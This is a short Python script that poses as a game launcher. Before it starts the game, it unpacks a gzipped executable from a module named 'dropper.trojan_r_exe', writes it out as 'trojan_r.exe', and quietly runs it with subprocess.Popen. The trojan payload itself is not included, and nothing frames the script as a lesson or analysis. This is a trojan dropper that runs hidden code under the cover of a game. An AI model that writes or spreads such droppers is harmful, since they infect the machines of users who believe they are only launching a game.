import os
import stat
import gzip
import subprocess
from game import *

if __name__ == '__main__':
    import dropper.trojan_r_exe as trojan
    exeFile = unpack_trojan(trojan.gzipped, 'trojan_r.exe')
    subprocess.Popen(exeFile)
    start_game()
